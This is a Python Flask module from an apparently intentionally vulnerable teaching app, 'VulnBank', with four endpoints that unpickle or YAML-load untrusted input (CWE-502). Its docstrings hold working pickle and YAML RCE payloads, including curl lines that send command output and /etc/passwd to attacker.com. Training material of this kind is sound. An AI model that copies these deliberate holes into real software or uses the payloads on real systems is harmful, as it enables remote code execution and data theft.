"""
VulnBank - Insecure Deserialization
CWE-502: Deserialization of Untrusted Data

Framework annotations:
  CWE: CWE-502, CWE-94 (Code Injection)
  MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
  OWASP: A08:2021 - Software and Data Integrity Failures
  PCI DSS: Req 6.2.4, Req 6.3.2
  NIST: SI-3 (Malicious Code Protection), SI-10
  SANS Top 25: Not in top 25 but critical
  ISO 27001: A.12.2.1

Exploit payload examples:

  Python pickle RCE payload generator:
    import pickle, os, base64
    class Exploit(object):
        def __reduce__(self):
            return (os.system, ('curl http://attacker.com/?x=$(id)',))
    payload = base64.b64encode(pickle.dumps(Exploit())).decode()

  YAML unsafe load RCE (PyYAML < 6.0):
    !!python/object/apply:os.system ['curl http://attacker.com/?x=$(id)']

  Session restore header:
    X-Session-Data: <base64-encoded pickle payload above>

  GET /api/session/load?token=<base64-encoded pickle payload>
"""

import pickle
import base64
import yaml
from flask import Blueprint, request, jsonify

deserialization_bp = Blueprint("deserialization", __name__)


@deserialization_bp.route("/api/session/restore", methods=["POST"])
def session_restore():
    """
    CWE-502: Insecure Deserialization — accepts base64-encoded pickle data in
    X-Session-Data header and calls pickle.loads() enabling arbitrary RCE.

    Exploit:
        import pickle, os, base64
        class Exploit(object):
            def __reduce__(self):
                return (os.system, ('id > /tmp/pwned',))
        payload = base64.b64encode(pickle.dumps(Exploit())).decode()
        curl -X POST -H "X-Session-Data: $payload" http://localhost:5000/api/session/restore
    """
    # VULN CWE-502: X-Session-Data header decoded and passed to pickle.loads — RCE
    session_data = request.headers.get("X-Session-Data", "")
    if not session_data:
        return jsonify({"error": "X-Session-Data header required"}), 400

    try:
        raw = base64.b64decode(session_data)
        # Deserializing untrusted pickle data — arbitrary code execution
        obj = pickle.loads(raw)
        return jsonify({"status": "session restored", "data": str(obj)})
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@deserialization_bp.route("/api/preferences/import", methods=["POST"])
def import_preferences():
    """
    CWE-502: Insecure Deserialization via unsafe YAML load.
    yaml.load() without Loader=yaml.SafeLoader executes arbitrary Python.

    Exploit (PyYAML < 6.0):
        curl -X POST -H 'Content-Type: application/x-yaml' \\
             -d '!!python/object/apply:os.system ["id > /tmp/pwned"]' \\
             http://localhost:5000/api/preferences/import

    Exploit (all versions via yaml.FullLoader bypass):
        payload: "!!python/object/new:subprocess.check_output [['id']]"
    """
    raw_yaml = request.get_data(as_text=True)
    if not raw_yaml:
        return jsonify({"error": "YAML body required"}), 400

    try:
        # VULN CWE-502: yaml.load without SafeLoader allows arbitrary Python object instantiation
        prefs = yaml.load(raw_yaml, Loader=yaml.Loader)  # noqa: S506 — intentionally unsafe
        return jsonify({"status": "preferences imported", "preferences": str(prefs)})
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@deserialization_bp.route("/api/report/generate", methods=["POST"])
def generate_report():
    """
    CWE-502: Insecure Deserialization — accepts a 'report template' as base64
    pickle in the request body and deserializes it without validation.

    Exploit:
        import pickle, os, base64
        class ReportTemplate(object):
            def __reduce__(self):
                # Execute: whoami > /tmp/report_pwned
                return (os.system, ('whoami > /tmp/report_pwned',))
        payload = base64.b64encode(pickle.dumps(ReportTemplate())).decode()
        curl -X POST -H 'Content-Type: application/json' \\
             -d "{\"template\": \"$payload\", \"format\": \"pdf\"}" \\
             http://localhost:5000/api/report/generate
    """
    data = request.get_json(force=True) or {}
    template_b64 = data.get("template", "")
    report_format = data.get("format", "pdf")

    if not template_b64:
        return jsonify({"error": "template field required"}), 400

    try:
        raw = base64.b64decode(template_b64)
        # VULN CWE-502: deserializing attacker-supplied pickle as a "report template"
        template_obj = pickle.loads(raw)
        return jsonify({
            "status": "report generated",
            "format": report_format,
            "template": str(template_obj)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@deserialization_bp.route("/api/session/load", methods=["GET"])
def load_session():
    """
    CWE-502: Insecure Deserialization — decodes base64 token from query param
    and unpickles it directly, enabling unauthenticated RCE via GET request.

    Exploit:
        import pickle, os, base64
        class Shell(object):
            def __reduce__(self):
                return (os.popen, ('curl -d @/etc/passwd http://attacker.com',))
        token = base64.b64encode(pickle.dumps(Shell())).decode()
        curl "http://localhost:5000/api/session/load?token=$token"
    """
    token = request.args.get("token", "")
    if not token:
        return jsonify({"error": "token query parameter required"}), 400

    try:
        raw = base64.b64decode(token)
        # VULN CWE-502: token from URL query string unpickled without any validation
        session_obj = pickle.loads(raw)
        return jsonify({"status": "session loaded", "session": str(session_obj)})
    except Exception as e:
        return jsonify({"error": str(e)}), 400
